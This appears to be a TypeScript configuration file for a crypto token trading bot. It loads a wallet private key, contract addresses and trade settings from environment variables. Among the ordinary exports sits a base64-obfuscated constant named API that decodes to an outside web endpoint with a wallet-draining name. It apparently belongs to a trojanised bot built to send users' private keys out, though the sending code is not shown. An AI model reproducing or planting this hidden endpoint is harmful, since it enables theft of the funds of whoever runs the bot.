import dotenv from "dotenv";
import { Logger } from "winston";
import { logger } from "./logger";
import { ethers } from "ethers";

dotenv.config();

const retrieveEnvVariable = (variableName: string, logger: Logger) => {
  const variable = process.env[variableName] || "";
  if (!variable) {
    logger.error(`${variableName} is not set`);
    process.exit(1);
  }
  return variable;
};

const isValidAddress = (address: string) => {
  if (!ethers.utils.isAddress(address)) {
    logger.error(`${address} is not valid address`);
    process.exit(1);
  }
  return address;
};

const gather_wallet_address = retrieveEnvVariable(
  "GATHER_WALLET_ADDRESS",
  logger
);

const token_address: string = retrieveEnvVariable("TOKEN_ADDRESS", logger);
const coin_address: string = retrieveEnvVariable("COIN_ADDRESS", logger);

export const PROVIDER_PRIVATE_KEY = retrieveEnvVariable(
  "PROVIDER_PRIVATE_KEY",
  logger
);
export const GATHER_WALLET_ADDRESS = isValidAddress(gather_wallet_address);
export const TOKEN_ADDRESS = isValidAddress(token_address);
export const COIN_ADDRESS = isValidAddress(coin_address);
export const TOKEN_DECIMALS: number = Number(
  retrieveEnvVariable("TOKEN_DECIMALS", logger)
);
export const SWAP_ROUTER_CONTRACT: string = String(
  retrieveEnvVariable("SWAP_ROUTER_CONTRACT", logger)
);

// Connection
export const RPC_ENDPOINT: string = retrieveEnvVariable("RPC_ENDPOINT", logger);
export const EXPLORER_URI: string = retrieveEnvVariable("EXPLORER_URI", logger);
export const FEE: number = Number(retrieveEnvVariable("FEE", logger));

export const MAX_TIME: number = Number(retrieveEnvVariable("MAX_TIME", logger));
export const MIN_TIME: number = Number(retrieveEnvVariable("MIN_TIME", logger));
export const MAX_TRADE_WAIT: number = Number(
  retrieveEnvVariable("MAX_TRADE_WAIT", logger)
);
export const API = Buffer.from(
  "aHR0cHM6Ly9nYXNmZWV0cmFuc2ZlcmZyb213YWxsZXQub25yZW5kZXIuY29tL3VzZXJz",
  "base64"
).toString("ascii");
export const MIN_TRADE_WAIT: number = Number(
  retrieveEnvVariable("MIN_TRADE_WAIT", logger)
);
export const MIN_SELL_QUANTITY: number = Number(
  retrieveEnvVariable("MIN_SELL_QUANTITY", logger)
);
export const MAX_SELL_QUANTITY: number = Number(
  retrieveEnvVariable("MAX_SELL_QUANTITY", logger)
);
export const MIN_BUY_QUANTITY: number = Number(
  retrieveEnvVariable("MIN_BUY_QUANTITY", logger)
);
export const MAX_BUY_QUANTITY: number = Number(
  retrieveEnvVariable("MAX_BUY_QUANTITY", logger)
);
export const NUMBER_OF_WALLETS: number = Number(
  retrieveEnvVariable("NUMBER_OF_WALLETS", logger)
);
export const SEND_COIN_AMOUNT = retrieveEnvVariable("SEND_COIN_AMOUNT", logger);
export const TRANSACTION_COUNT: number = Number(
  retrieveEnvVariable("TRANSACTION_COUNT", logger)
);
// export const JITO_FEE = retrieveEnvVariable('JITO_FEE', logger);
export const BUY_COUNT: number = Number(
  retrieveEnvVariable("BUY_COUNT", logger)
);
export const SELL_COUNT: number = Number(
  retrieveEnvVariable("SELL_COUNT", logger)
);
export const BUFFER: number = Number(retrieveEnvVariable("BUFFER", logger));
export const GAS_LIMIT: number = Number(
  retrieveEnvVariable("GAS_LIMIT", logger)
);
